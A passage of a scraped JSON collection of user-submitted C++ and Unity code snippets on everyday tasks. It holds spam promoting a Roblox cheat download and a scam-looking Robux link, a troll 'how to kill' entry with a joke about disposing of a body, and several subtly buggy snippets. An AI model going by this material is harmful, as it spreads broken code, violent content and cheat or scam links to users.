    "description": " I WaTcH MiCkY MoUsE  \n        my sis still watch baby cartoons     \n( 11.06 MB )JJSploit here: https://wearedevs.net/d/JJSploit #CalumArmy #JJSploit #RobloxHack Roblox.com/support JJSPLOIT:/w  \"Urbux.BuZz  https://wearedevs.net/d/JJSploit \n",
    "reg_date": "2021-10-12T11:41:00.000Z"
  },
  {
    "id": 2486,
    "keyword": null,
    "link": null,
    "title": " how to handle files with c++",
    "description": "#include <iostream> #include <fstream> #include <windows.h> using namespace std;  int main () {   //write   ofstream writer(\"file.txt\");   string test = \" /nTest2\";   writer << \"Test text\";   writer << test;   writer.close();      //read   ifstream reader(\"file.txt\");   string getter   while (getline(reader, getter)) \t\t\t{ \t\t\t\tdataAdderInp >> getter; \t\t\t}      cout << getter;   // add a new text to an exist file and keep the text that is in it.   ofstream add(\"file.txt\", std::ios::out | std::ios::app);   add << \"/n bonus text\";   add.close();   return 0; } //if you run this you will get: // -a file with: \"Text text /n Test2\" // -and a console output: \"Text text /n Test2\" // -and in the end your file will get a text, so it will looks like: \"Text text /n Test2 /n bonus text\"\n",
    "reg_date": "2021-10-12T11:41:00.000Z"
  },
  {
    "id": 2487,
    "keyword": null,
    "link": null,
    "title": " how to handle variable length argument in c++",
    "description": "#include <cstdarg> #include <iostream>   using namespace std;   // this function will take the number of values to average // followed by all of the numbers to average double average ( int num, ... ) {   va_list arguments;                     // A place to store the list of arguments   double sum = 0;     va_start ( arguments, num );           // Initializing arguments to store all values after num   for ( int x = 0; x < num; x++ )        // Loop until all numbers are added     sum += va_arg ( arguments, double ); // Adds the next value in argument list to sum.   va_end ( arguments );                  // Cleans up the list     return sum / num;                      // Returns the average } int main() {     // this computes the average of 13.2, 22.3 and 4.5 (3 indicates the number of values to average)   cout<< average ( 3, 12.2, 22.3, 4.5 ) <<endl;     // here it computes the average of the 5 values 3.3, 2.2, 1.1, 5.5 and 3.3   cout<< average ( 5, 3.3, 2.2, 1.1, 5.5, 3.3 ) <<endl; } \n",
    "reg_date": "2021-10-12T11:41:01.000Z"
  },
  {
    "id": 2488,
    "keyword": null,
    "link": null,
    "title": " how to have a queue as a parameter in c++",
    "description": "void myFunc(std::queue<MyClass*>& myQueue) {    //do something }\n",
    "reg_date": "2021-10-12T11:41:01.000Z"
  },
  {
    "id": 2489,
    "keyword": null,
    "link": null,
    "title": " how to hide the c++ console",
    "description": "#include <WinUser.h>  ShowWindow(GetConsoleWindow(), SW_HIDE);\n",
    "reg_date": "2021-10-12T11:41:01.000Z"
  },
  {
    "id": 2490,
    "keyword": null,
    "link": null,
    "title": " how to hide the console c++",
    "description": "#include <WinUser.h>  int main {     ShowWindow(GetConsoleWindow(), SW_HIDE);          return 0; }\n#include <WinUser.h>  ShowWindow(GetConsoleWindow(), SW_HIDE);\n",
    "reg_date": "2021-10-12T11:41:01.000Z"
  },
  {
    "id": 2491,
    "keyword": null,
    "link": null,
    "title": " how to hide ui elements unity",
    "description": "GameObject.Find(\"the object name\").SetActive(false);\n",
    "reg_date": "2021-10-12T11:41:01.000Z"
  },
  {
    "id": 2492,
    "keyword": null,
    "link": null,
    "title": " how to ignore space in string in c++",
    "description": "#include <iostream>  std::string IgnoreWhitespace(std::string str) {     for(int i = 0; i < str.length(); i++)     {         if(str[i] == ' ') str.erase(i, 1);     }      return str; }  int main()  {     std::string str = \"W h i t e s p a c e\";      std::cout << IgnoreWhitespace(str); // Output = Whitespace      return 0; }\n",
    "reg_date": "2021-10-12T11:41:01.000Z"
  },
  {
    "id": 2493,
    "keyword": null,
    "link": null,
    "title": " how to implement stack c++",
    "description": "#include <bits/stdc++.h>   stack<int> stk; stk.push(5); int ans = stk.top(5); // ans =5 stk.pop();//removes 5\n// CPP program to illustrate  // Implementation of push() function  #include <iostream>  #include <stack>  using namespace std;     int main()  {      // Empty stack      stack<int> mystack;      mystack.push(0);      mystack.push(1);      mystack.push(2);         // Printing content of stack      while (!mystack.empty()) {          cout << ' ' << mystack.top();          mystack.pop();      }  }  \n",
    "reg_date": "2021-10-12T11:41:01.000Z"
  },
  {
    "id": 2494,
    "keyword": null,
    "link": null,
    "title": " how to include a library in arduino",
    "description": "#include <library_name>\n",
    "reg_date": "2021-10-12T11:41:01.000Z"
  },
  {
    "id": 2495,
    "keyword": null,
    "link": null,
    "title": " how to include everything in c++",
    "description": "#include<bits/stdc++.h>\n",
    "reg_date": "2021-10-12T11:41:01.000Z"
  },
  {
    "id": 2496,
    "keyword": null,
    "link": null,
    "title": " how to include seld declared header file in c++",
    "description": "#include \"Employee.h\" //Employee.h should be saved in the same directory. \n",
    "reg_date": "2021-10-12T11:41:01.000Z"
  },
  {
    "id": 2497,
    "keyword": null,
    "link": null,
    "title": " how to index a array in cpp",
    "description": "int foo [5];\n",
    "reg_date": "2021-10-12T11:41:02.000Z"
  },
  {
    "id": 2498,
    "keyword": null,
    "link": null,
    "title": " how to initialize 2d array with values c++",
    "description": "int main() {     int arr[2][5] =     {         {1,8,12,20,25},         {5,9,13,24,26}     }; } \n#include <array> 2 #include <iostream> 3 4 using namespace std; 5 6 //remember const! 7 const int ROWS = 2; 8 const int COLS = 3;   int main(){  array<array<int, COLS>, ROWS> matrix = {  1, 2, 3,  4, 5, 6  };         return 0; }\n",
    "reg_date": "2021-10-12T11:41:02.000Z"
  },
  {
    "id": 2499,
    "keyword": null,
    "link": null,
    "title": " how to initialize a boolean in c++",
    "description": "bool b1 = true;      // declaring a boolean variable with true value\n",
    "reg_date": "2021-10-12T11:41:02.000Z"
  },
  {
    "id": 2500,
    "keyword": null,
    "link": null,
    "title": " how to initialize a vector in c++",
    "description": "// CPP program to create an empty vector  // and push values one by one.  #include <vector>  using namespace std; int main()  {      // Create an empty vector      vector<int> vect;       //add/push an integer to the end of the vector     vect.push_back(10);  \t//to traverse and print the vector from start to finish     for (int x : vect)          cout << x << \" \";      return 0;  }\n// First include the vector library: #include <vector>  // The syntax to create a vector looks like this: std::vector<type> name;  // We can create & initialize \"lol\" vector with specific values: std::vector<double> lol = {66.666, -420.69};  // it would look like this: 66.666 | -420.69\n vector<int> arr(10,0);\n#include <iostream> #include <vector>   #define M 3 #define N 4   int main() {   // specify default value to fill the vector elements   int default_value = 1;   // first initialize a vector of ints with given default value   std::vector<int> v(N, default_value);   // Use above vector to initialize the two-dimensional vector   std::vector<std::vector<int>> matrix(M, v);      return 0; } \n#include <bits/stdc++.h>  #include <vector>  using namespace std;     int main()  {  // This vector initializes with the values: 10, 20, and 30   vector<int> vect{ 10, 20, 30 };       return 0;  } \nstd::vector<type> name;\n",
    "reg_date": "2021-10-12T11:41:02.000Z"
  },
  {
    "id": 2501,
    "keyword": null,
    "link": null,
    "title": " how to initialize an struct object in c++",
    "description": "// exemple avec la structure Coordonnees : struct Coordonnees {   int x;   int y; }  int main() {   Coordonnees coords = {1,2}; }\n",
    "reg_date": "2021-10-12T11:41:02.000Z"
  },
  {
    "id": 2502,
    "keyword": null,
    "link": null,
    "title": " how to initialize array with new in c++",
    "description": "int* a = NULL;   // Pointer to int, initialize to nothing. int n;           // Size needed for array cin >> n;        // Read in the size a = new int[n];  // Allocate n ints and save ptr in a. for (int i=0; i<n; i++) {     a[i] = 0;    // Initialize all elements to zero. } . . .  // Use a as a normal array delete [] a;  // When done, free memory pointed to by a. a = NULL;     // Clear a to prevent using invalid memory reference. \nint nCount[] = {1, 2, 3, 4, 5};\nint arr[3] = {1, 5, 4};\n",
    "reg_date": "2021-10-12T11:41:02.000Z"
  },
  {
    "id": 2503,
    "keyword": null,
    "link": null,
    "title": " how to initialize map in c++",
    "description": "std::map<std::string,std::string> my_map = {   {\"key1\",\"value1\"},   {\"key2\",\"value2\"} };\nstd::map<std::string, int> mapOfMarks = { \t\t{\"Riti\",2}, \t\t{\"Jack\",4} };\n",
    "reg_date": "2021-10-12T11:41:02.000Z"
  },
  {
    "id": 2504,
    "keyword": null,
    "link": null,
    "title": " how to initialize the object in constructor in c++",
    "description": "BigMommaClass {     BigMommaClass(int, int);  private:     ThingOne thingOne;     ThingTwo thingTwo; };  BigMommaClass::BigMommaClass(int numba1, int numba2): thingOne(numba1 + numba2), thingTwo(numba1, numba2) { // Code here }\n",
    "reg_date": "2021-10-12T11:41:02.000Z"
  },
  {
    "id": 2505,
    "keyword": null,
    "link": null,
    "title": " how to initialize vector",
    "description": "// CPP program to create an empty vector  // and push values one by one.  #include <vector>  using namespace std; int main()  {      // Create an empty vector      vector<int> vect;       //add/push an integer to the end of the vector     vect.push_back(10);  \t//to traverse and print the vector from start to finish     for (int x : vect)          cout << x << \" \";      return 0;  }\n#include <iostream> #include <vector>   #define M 3 #define N 4   int main() {   // specify default value to fill the vector elements   int default_value = 1;   // first initialize a vector of ints with given default value   std::vector<int> v(N, default_value);   // Use above vector to initialize the two-dimensional vector   std::vector<std::vector<int>> matrix(M, v);      return 0; } \nvector<int> vect{ 10, 20, 30 };\nvector<int> a;                                       // empty vector of ints vector<int> b (5, 10);                                // five ints with value 10 vector<int> c (b.begin(),b.end());                     // iterating through second vector<int> d (c);                                   // copy of c\n// CPP program to create an empty vector // and push values one by one. #include <bits/stdc++.h> using namespace std;  int main() { \tint n = 3;  \t// Create a vector of size n with \t// all values as 10. \tvector<int> vect(n, 10);  \tfor (int x : vect) \t\tcout << x << \" \";  \treturn 0; } \n",
    "reg_date": "2021-10-12T11:41:02.000Z"
  },
  {
    "id": 2506,
    "keyword": null,
    "link": null,
    "title": " how to initialized a 2d vector",
    "description": "To be used in DP problems:  vector<vector<int>>dp; //global init  dp = vector<vector<int>>(n,vector<int>(m,0)); // local init for test cases where, \tn, m = dimensions of matrix\nvector<vector<int> > vec( n , vector<int> (m, 0));\n// Initializing 2D vector \"vect\" with  // values  vector<vector<int> > vect{ { 1, 2, 3 },                             { 4, 5, 6 },                             { 7, 8, 9 } }; \nvector<vector<int> >    v2(8, vector<int>(5)); \n",
    "reg_date": "2021-10-12T11:41:03.000Z"
  },
  {
    "id": 2507,
    "keyword": null,
    "link": null,
    "title": " how to input a file path in c++",
    "description": "int main() {     std::cout << \"Please enter the file name: \";     std::string name;     std::getline (std::cin, name);     ifstream ifs(name.c_str());     if (!ifs) error(\"can't open input file \", name);      vector < Point > points;     Point p;     while (ifs >> p) points.push_back(p);     // .... }\n",
    "reg_date": "2021-10-12T11:41:03.000Z"
  },
  {
    "id": 2508,
    "keyword": null,
    "link": null,
    "title": " how to input a vector when size is unknown",
    "description": "#include <string> #include <vector> #include <sstream> #include <string>  int main() {     std::vector<int> vec;     std::string buffer;     int data;     std::getline(std::cin, buffer);     std::istringstream iss(buffer);     while (iss >> data)           vec.push_back(data);     //foo(vec);    }\n",
    "reg_date": "2021-10-12T11:41:03.000Z"
  },
  {
    "id": 2509,
    "keyword": null,
    "link": null,
    "title": " how to input multiple lines of a file in c++",
    "description": "#include <iostream> #include <fstream> #include <sstream> #include <string>  using namespace std;  int main() {          ifstream in(\"file.txt\");     stringstream sstr;     while(in >> sstr.rdbuf());     cout << sstr.str() << endl;        return 0; } \n",
    "reg_date": "2021-10-12T11:41:03.000Z"
  },
  {
    "id": 2510,
    "keyword": null,
    "link": null,
    "title": " how to install all c++ tools linux",
    "description": "# apt-get update && apt-get install build-essential      OR $ sudo get update && apt-get install build-essential \n",
    "reg_date": "2021-10-12T11:41:03.000Z"
  },
  {
    "id": 2511,
    "keyword": null,
    "link": null,
    "title": " how to install boost c++ on windows",
    "description": "goto \" https://www.boost.org/users/download/ \" goto \"Prebuilt windows binaries\" click on the version you want dowload the last .exe version install and it's all good\n",
    "reg_date": "2021-10-12T11:41:03.000Z"
  },
  {
    "id": 2512,
    "keyword": null,
    "link": null,
    "title": " how to install c++ compiler without admin",
    "description": "/*   1.Download cygwin from this site https://cygwin.com/install.html   2. go in the comand prromt   3. cd to the folder where setup-x86_64.exe  is   4. type setup-x86_64.exe --no-admin   5. now install these packages:   \t        gcc-g++             make             gdb                                          6. now use any ide ( I use clion )       7.DONE!!  (:         */  \n",
    "reg_date": "2021-10-12T11:41:03.000Z"
  },
  {
    "id": 2513,
    "keyword": null,
    "link": null,
    "title": " how to install opencv c++ on windows vscode",
    "description": "OS: Windows 10 64-bit Compiler: Mingw-w64 (Specifically, x86_64-8.1.0-posix-seh-rt_v6-rev0) Compiler binaries' path: C:\\\\mingw-w64\\\\x86_64-8.1.0-posix-seh-rt_v6-rev0\\\\mingw64\\\\bin OpenCV version: 4.1.1 OpenCV binaries' path: C:\\\\opencv\\\\OpenCV-MinGW-Build-OpenCV-4.1.1-x64\\\\x64\\\\mingw\\\\bin \n",
    "reg_date": "2021-10-12T11:41:03.000Z"
  },
  {
    "id": 2514,
    "keyword": null,
    "link": null,
    "title": " how to interface c++ in haxe",
    "description": "Im not exactly sure how this works but it do....     Haxe file:   @:include(\"helloWorld.cpp\")  @:native(\"cppClass\")  extern class CppClass {     @:native(\"cppClass::helloFromCpp\") static public function helloFromCpp():Void; }    class Main {     static public function main() {         CppClass.helloFromCpp();     } }     CPP file ( called helloWorld.cpp): #include <iostream> class Geeks  {      public:   \t\tstatic helloFromCpp(){          std::cout << \"hello from cpp!\";          }        }\n",
    "reg_date": "2021-10-12T11:41:03.000Z"
  },
  {
    "id": 2515,
    "keyword": null,
    "link": null,
    "title": " how to iterate in string in c++",
    "description": "#include<iostream> using namespace std; main() {    string my_str = \"Hello World\";    for(int i = 0; i<my_str.length(); i++) {       cout << my_str.at(i) << endl; //get character at position i    } }\n// string::begin/end #include <iostream> #include <string>  int main () {   std::string str (\"Test string\");   for ( std::string::iterator it=str.begin(); it!=str.end(); ++it)     std::cout << *it << endl;   std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:41:03.000Z"
  },
  {
    "id": 2516,
    "keyword": null,
    "link": null,
    "title": " how to iterate over 2d vector c++",
    "description": "#include<iostream> #include<vector> using namespace std; /* Iterate over vector of vectors and for each of the  nested vector print its contents */ template <typename T> void print_2d_vector(const vector< vector<T> > & matrix) {     for(auto row_obj : matrix)     {         for (auto elem: row_obj)         {             cout<<elem<<\", \";         }         cout<<endl;     }     cout<<endl; }\n",
    "reg_date": "2021-10-12T11:41:04.000Z"
  },
  {
    "id": 2517,
    "keyword": null,
    "link": null,
    "title": " how to iterate over unordered map c++",
    "description": "for(auto it : umap){   cout<< it->first << \" \" << it->second << endl; }  /* umap = [ \t{1 , \"Hello\"},     {2 , \"world\"} ] */   /*  Output :  1 Hello  2 World */\n",
    "reg_date": "2021-10-12T11:41:04.000Z"
  },
  {
    "id": 2518,
    "keyword": null,
    "link": null,
    "title": " how to iterate throguh a string in c++",
    "description": "void print(const std::string &s) {     for (std::string::size_type i = 0; i < s.size(); i++) {         std::cout << s[i] << ' ';     } } \n",
    "reg_date": "2021-10-12T11:41:04.000Z"
  },
  {
    "id": 2519,
    "keyword": null,
    "link": null,
    "title": " how to iterate through a map in c++",
    "description": "//traditional way (long) for(map<string,int>::iterator it=m.begin(); it!=m.end(); ++it) \tif(it->second)cout<<it->first<<\" \"; //easy way(short) just works with c++11 or later versions for(auto &x:m) \tif(x.second)cout<<x.first<<\" \"; //condition is just an example of use \n//Since c++17 for (auto& [key, value]: myMap) {     cout << key << \" has value \" << value << endl; } //Since c++11 for (auto& kv : myMap) {     cout << kv.first << \" has value \" << kv.second << endl; }\n",
    "reg_date": "2021-10-12T11:41:04.000Z"
  },
  {
    "id": 2520,
    "keyword": null,
    "link": null,
    "title": " how to iterate through array in c++",
    "description": "for(int i=0; i<n; i++)   cout<<array[i]<<\" \"   cout<<endl;\n",
    "reg_date": "2021-10-12T11:41:04.000Z"
  },
  {
    "id": 2521,
    "keyword": null,
    "link": null,
    "title": " how to iterate trough a vector in c++",
    "description": "vector<int> myVector;  myVector.push_back(1); myVector.push_back(2); myVector.push_back(3); myVector.push_back(4);  for(auto x: myVector){ \tcout<< x << \" \";  }  vector<pair<int,int>> myVectorOfPairs;  myVectorOfPairs.push_back({1,2}); myVectorOfPairs.push_back({3,4}); myVectorOfPairs.push_back({5,6}); myVectorOfPairs.push_back({7,8});  for(auto x: myVectorOfPairs){ \tcout<< x.first << \" \" << x.second << endl;  }       \nfor(auto const& value: a) {      /* std::cout << value; ... */ }\n// vector::begin/end #include <iostream> #include <vector>  int main () {   std::vector<int> myvector;   for (int i=1; i<=5; i++) myvector.push_back(i);    std::cout << \"myvector contains:\";   for (std::vector<int>::iterator it = myvector.begin() ; it != myvector.end(); ++it)     std::cout << ' ' << *it;   std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:41:04.000Z"
  },
  {
    "id": 2522,
    "keyword": null,
    "link": null,
    "title": " how to iterater map of sets in c++",
    "description": "    map<string, set<string>> mp;      for (auto const& pair : mp) {          cout << pair.first << \": \";          for (auto const& elem : pair.second) {              cout << elem << \", \";          }          cout << \"\\n\";      }\n",
    "reg_date": "2021-10-12T11:41:04.000Z"
  },
  {
    "id": 2523,
    "keyword": null,
    "link": null,
    "title": " how to keep aspect ratio sfml",
    "description": "// the event loop sf::Event event; while (window.pollEvent(event)) {     ...      // catch the resize events     if (event.type == sf::Event::Resized)     {         // update the view to the new size of the window         sf::FloatRect visibleArea(0, 0, event.size.width, event.size.height);         window.setView(sf::View(visibleArea));     } } \n",
    "reg_date": "2021-10-12T11:41:04.000Z"
  },
  {
    "id": 2524,
    "keyword": null,
    "link": null,
    "title": " how to kill",
    "description": "print(\"Please don't kill people\")\nyu stupid i am FBI\nsudo kill <PID>\nprint(\"GURUTHECODER IS THE ANSWER.\")\nTip - after killing chop the body in little pieces, cook the pieces and feed to a meat eating animal or eat it yourself\n#include <iostream>   int main() {  std::cout << \"cock and balls\";   return 0; }\n",
    "reg_date": "2021-10-12T11:41:04.000Z"
  },
  {
    "id": 2525,
    "keyword": null,
    "link": null,
    "title": " how to know  the number of a certain substring in a string in c++",
    "description": "int nPos = str_to_search.find(str, 0);  while (nPos != string::npos) { \tcount++; \tnPos = str_to_search.find(str, nPos + str.size()); }\n",
    "reg_date": "2021-10-12T11:41:04.000Z"
  },
  {
    "id": 2526,
    "keyword": null,
    "link": null,
    "title": " how to know datatype of something in c++",
    "description": "int k; cout << typeid(k).name() << endl;\n",
    "reg_date": "2021-10-12T11:41:05.000Z"
  },
  {
    "id": 2527,
    "keyword": null,
    "link": null,
    "title": " how to load from files C++",
    "description": "// basic file operations #include <iostream> #include <fstream> using namespace std;  int main () {   ofstream myfile;   myfile.open (\"example.txt\");   myfile << \"Writing this to a file.\\n\";   myfile.close();   return 0; }\n",
    "reg_date": "2021-10-12T11:41:05.000Z"
  },
  {
    "id": 2528,
    "keyword": null,
    "link": null,
    "title": " how to lock and hide the cursor unity",
    "description": "//to lock in the centre of window Cursor.lockState = CursorLockMode.Locked; //to hide the curser Cursor.visible = false;   Cursor.lockState = CursorLockMode.None; Cursor.visible = true;\nCursor.lockState = CursorLockMode.None; // to unlock cursor Cursor.visible = true; // to make cursor visible\nCursor.lockState = CursorLockMode.None; // this is to lock the cursor Cursor.visible = true; //this is to make cursor visible\nCursor.lockState = CursorLockMode.None; // this is to unlock the cursor Cursor.visible = true;\n",
    "reg_date": "2021-10-12T11:41:05.000Z"
  },
  {
    "id": 2529,
    "keyword": null,
    "link": null,
    "title": " how to lock window resize c++ sfml'",
    "description": "sf::RenderWindow wn(sf::VideoMode(620.f, 620.f),\"Lvl Editor\",sf::Style::Close);  //this only allows the window to close or minimize and prevents it from resizing\n",
    "reg_date": "2021-10-12T11:41:05.000Z"
  },
  {
    "id": 2530,
    "keyword": null,
    "link": null,
    "title": " how to make a 2d vector in c++",
    "description": "// Create a vector containing n  //vectors of size m, all u=initialized with 0 vector<vector<int> > vec( n , vector<int> (m, 0));  \nvector< vector<int>> a(rows, vector<int> (cols));\n// Initializing 2D vector \"vect\" with  // values  vector<vector<int> > vect{ { 1, 2, 3 },                             { 4, 5, 6 },                             { 7, 8, 9 } }; \n2D vector\n",
    "reg_date": "2021-10-12T11:41:05.000Z"
  },
  {
    "id": 2531,
    "keyword": null,
    "link": null,
    "title": " how to make a Loop in c++",
    "description": "//'i' can be any number //Can be any comparison operater  //can be any number compared //can be any mathmatic operater  for (int i = 0; i<100; i++){ //Do thing }  //more info on operaters //https://www.w3schools.com/cpp/cpp_operators.asp\nfor (int i; i < 10; i++) {   cout << i << \"\\n\"; }\n",
    "reg_date": "2021-10-12T11:41:05.000Z"
  },
  {
    "id": 2532,
    "keyword": null,
    "link": null,
    "title": " how to make a adittion calculator in c++",
    "description": "#include <iostream> using namespace std;  int main() {     float firstCalculation = 0.00, secondCalculation = 0.00;     cout << \"Enter the first calculation, it's addition anyway!\\n\";     cin >> firstCalculation;     cout << \"Enter your second calculation\\n\";     cin >> secondCalculation;     float fullCalculation = firstCalculation + secondCalculation;     cout << \"The answer is: \" << fullCalculation;          return 0; }\n",
    "reg_date": "2021-10-12T11:41:05.000Z"
  },
  {
    "id": 2533,
    "keyword": null,
    "link": null,
    "title": " how to make a array in c++",
    "description": "int foo [] = { 16, 2, 77, 40, 12071 };\nvoid initarr(int arrgender[TOT_MALE][TOT_FEMALE])   {       for(int a =0; a < TOT_MALE;a++)       {           for(int b = 0; b < TOT_FEMALE;b++)           {               arrgender[a][b] = 0;           }       }\n// datatype var_name[howmuch value you need to store] = {values, values} int a[5] = {1, 2 3, 4, 5};\nint foo[5] = {0};\n",
    "reg_date": "2021-10-12T11:41:05.000Z"
  },
  {
    "id": 2534,
    "keyword": null,
    "link": null,
    "title": " how to make a calculator in c++",
    "description": "// ONLY 29 LINES OF CODE IN TOTAL // For better calculator scroll down on this post #include <iostream> using namespace std; int main() { \tcout << \"Please enter the first number: \"; \tdouble n1 = 0; \tcin >> n1; \tcout << \"Please enter an operator (+, -, *, /): \"; \tchar op = '0'; \tcin >> op; \tcout << \"Please enter a second number: \"; \tdouble n2 = 0; \tcin >> n2; \tdouble answer = 0; \tswitch (op) { \tcase '+':  \t\tanswer = n1 + n2; \t\tbreak; \tcase '-': \t\tanswer = n1 - n2; \t\tbreak; \tcase '*':  \t\tanswer = n1 * n2; \t\tbreak; \tcase '/':  \t\tanswer = n1 / n2; \t\tbreak; \t} \tcout << \"Thanks for using my calculator your answer is: \" << answer;      // this is the better calculator:      #include <iostream> #include <Windows.h> using namespace std; int main() { \tchar jim = 'j'; \tdo { \t\t \t\tcout << \"Please enter the first number: \"; \t\tdouble n1 = 0; \t\tcin >> n1; \t\tcout << \"Please enter an operator (+, -, *, /): \"; \t\tchar op = '0'; \t\tcin >> op; \t\tcout << \"Please enter a second number: \"; \t\tdouble n2 = 0; \t\tcin >> n2; \t\tdouble answer = 0; \t\tswitch (op) { \t\tcase '+': \t\t\tanswer = n1 + n2; \t\t\tbreak; \t\tcase '-': \t\t\tanswer = n1 - n2; \t\t\tbreak; \t\tcase '*': \t\t\tanswer = n1 * n2; \t\t\tbreak; \t\tcase '/': \t\t\tanswer = n1 / n2; \t\t\tbreak; \t\t} \t\tcout << \"Thanks for using my calculator your answer is: \" << answer << \" do you want to run the program again? (y or n) \"; \t\tcin >> jim;  \t} while (jim = 'y' && jim != 'n'); \tif (jim = 'n') { \t\tcout << \"Thanks for using my calculator here is sum epic music\"; \t\tBeep(329, 300); \t\tBeep(493, 300); \t\tBeep(698, 300); \t\tBeep(659, 600);  \t\tBeep(783, 300); \t\tBeep(698, 300); \t\tBeep(659, 600);  \t\tBeep(329, 100); \t\tBeep(493, 300); \t\tBeep(698, 300); \t\tBeep(659, 600);  \t\tBeep(392, 250); \t\tBeep(440, 200); \t\tBeep(587, 300);  \t\tBeep(349, 250); \t\tBeep(587, 500);  \t\tBeep(329, 300); \t\tBeep(493, 300); \t\tBeep(698, 300); \t\tBeep(659, 600);  \t\tBeep(783, 300); \t\tBeep(698, 300); \t\tBeep(659, 600);  \t\tBeep(329, 100); \t\tBeep(493, 300); \t\tBeep(698, 300); \t\tBeep(659, 600);  \t\tBeep(392, 250); \t\tBeep(440, 200); \t\tBeep(587, 300);  \t\tBeep(349, 250); \t\tBeep(587, 400); \t} \treturn 0; }\n#include<iostream> using namespace std; int calculator(int num1,int num2,int num3); int main() {     //int num1,num2,num3,choice;     int a,b,c,choice;     cout<<\"enter the first number\"<<endl;     cin>>a;     cout<<\"enter the second number\"<<endl;     cin>>b;     cout<<\"************************\"<<endl;     cout<<\"****Make your choice****\"<<endl;     cout<<\"1.Addition\"<<endl;     cout<<\"2.Subtraction\"<<endl;     cout<<\"3.Multiplication\"<<endl;     cout<<\"4.Division\"<<endl;     cout<<\"************************\"<<endl;      choice=calculator(a,b,c);     return 0; } int calculator(int num1,int num2,int num3) {      int choice;     cin>>choice;     switch(choice)     {          case 1: cout<<\"you have selected Addition\"<<endl;                 num3=num1+num2;                 cout<<\"Addition of two numbers is \"<<num3<<endl;                 break;          case 2: cout<<\"you have selected Subtraction\"<<endl;                 num3=num1-num2;                 cout<<\"Subtraction of two numbers is \"<<num3<<endl;                 break;          case 3: cout<<\"you have selected Multiplication\"<<endl;                 num3=num1*num2;                 cout<<\"Multiplication of two numbers is \"<<num3<<endl;                 break;          case 4: cout<<\"You have selected Division\"<<endl;                 num3=num1/num2;                 cout<<\"Division of two numbers is \"<<num3<<endl;                 break;          default: cout<<\"You have entered wrong choice\"<<endl;                     break;     } }  \n#include <iostream> using namespace std;  int main() {     char setOperator;     float firstNum = 0.00, secondNum = 0.00;     cout << \"Enter your operater: +, -, *, /:  \\n\";     cin >> setOperator;     cout << \"Enter your first calculation:  \\n\";     cin >> firstNum;     cout <<  \"Enter your second calculation:  \\n\";     cin >> secondNum;          switch(setOperator) {         case '+':         cout << \"The answer is: \" <<firstNum + secondNum;         break;                  case '-':         cout << \"The answer is:\" << firstNum - secondNum;         break;                  case '*':         cout << \"The answer is: \" << firstNum * secondNum;         break;                  case '/':         cout << \"The answer is: \" << firstNum / secondNum;         break;     }     return 0; }\n// This is for beginners  #include <iostream>  using namespace std;  void greetings() {     cout << \"welcome to the calculator made in c++ :D\\n\"; }  void instructions() {     cout << \"Here is the operators you can use + - / *\\n\"; }  int main() {     greetings();     instructions();     int num1, num2;     char op;     int result;     char again = 'Y';      while (again == 'y' || again == 'Y') {            cout << \"\\nEnter your first digit: \";         cin >> num1;          cout << \"\\nEnter your operator digit: \";         cin >> op;          cout << \"\\nEnter your second digit: \";         cin >> num2;          if (op == '+') {             result = num1 + num2;         }         else if (op == '-') {             result = num1 - num2;         }         else if (op == '*') {             result = num1 * num2;         }         else if (op == '/') {             result = num1 / num2;         }         else {             cout << \"Invalid operator\";         }          cout << \"= \" << result;         cout << \"\\nDo you want to restart the calculator? (Y or N)\";         cin >> again;     }      system(\"pause>0\");      return 0; }\n#include <iostream> using namespace std;  int main() { \tint choice;  \tcout << 1 << endl; \tcout << 2 << endl; \tcout << 3 << endl; \tcout << 4 << endl;  \tcout << \"Choice A Number: \"; \tcin >> choice;  \tif (choice >= 1 && choice <= 4) \t{ \t\tint a, b;  \t\tcout << \"Enter Num One: \"; \t\tcin >> a; \t\tcout << \"Enter Num Two: \"; \t\tcin >> b;  \t\tif (choice == 1) \t\t\tcout << a << \"+\" << b << \"=\" << a + b << endl; \t\tif (choice == 2) \t\t\tcout << a << \"-\" << b << \"=\" << a - b << endl; \t\tif (choice == 3) \t\t\tcout << a << \"*\" << b << \"=\" << a * b << endl; \t} \telse \t{ \t\tcout << \"Wrong Choice\" << endl; \t} }\n#include <iostream>  using namespace std;  int main() { int num1; int num2; char op;      cout << \"Enter a number:\" << endl;   cin >> num1; //takes input      cout << \"Enter another number:\" << endl; //prints some prompt   cin >> num2;      cout << \"Enter a operator:\" << endl; //prints some prompt   cin >> op;      if(op == '+')   {   cout << \"Result = \" << num1 + num2 << endl;   }else if(op == '-'){   cout << \"Result = \" << num1 - num2 << endl;   }else if(op == '*'){   cout << \"Result = \" << num1 * num2 << endl;   }else if(op == '/'){   cout << \"Result = \" << num1 / num2 << endl;   }       }\n",
    "reg_date": "2021-10-12T11:41:05.000Z"
  },
  {
    "id": 2535,
    "keyword": null,
    "link": null,
    "title": " how to make a calculator inc++",
    "description": "// ONLY 29 LINES OF CODE IN TOTAL // For better calculator scroll down on this post #include <iostream> using namespace std; int main() { \tcout << \"Please enter the first number: \"; \tdouble n1 = 0; \tcin >> n1; \tcout << \"Please enter an operator (+, -, *, /): \"; \tchar op = '0'; \tcin >> op; \tcout << \"Please enter a second number: \"; \tdouble n2 = 0; \tcin >> n2; \tdouble answer = 0; \tswitch (op) { \tcase '+':  \t\tanswer = n1 + n2; \t\tbreak; \tcase '-': \t\tanswer = n1 - n2; \t\tbreak; \tcase '*':  \t\tanswer = n1 * n2; \t\tbreak; \tcase '/':  \t\tanswer = n1 / n2; \t\tbreak; \t} \tcout << \"Thanks for using my calculator your answer is: \" << answer;      // this is the better calculator:      #include <iostream> #include <Windows.h> using namespace std; int main() { \tchar jim = 'j'; \tdo { \t\t \t\tcout << \"Please enter the first number: \"; \t\tdouble n1 = 0; \t\tcin >> n1; \t\tcout << \"Please enter an operator (+, -, *, /): \"; \t\tchar op = '0'; \t\tcin >> op; \t\tcout << \"Please enter a second number: \"; \t\tdouble n2 = 0; \t\tcin >> n2; \t\tdouble answer = 0; \t\tswitch (op) { \t\tcase '+': \t\t\tanswer = n1 + n2; \t\t\tbreak; \t\tcase '-': \t\t\tanswer = n1 - n2; \t\t\tbreak; \t\tcase '*': \t\t\tanswer = n1 * n2; \t\t\tbreak; \t\tcase '/': \t\t\tanswer = n1 / n2; \t\t\tbreak; \t\t} \t\tcout << \"Thanks for using my calculator your answer is: \" << answer << \" do you want to run the program again? (y or n) \"; \t\tcin >> jim;  \t} while (jim = 'y' && jim != 'n'); \tif (jim = 'n') { \t\tcout << \"Thanks for using my calculator here is sum epic music\"; 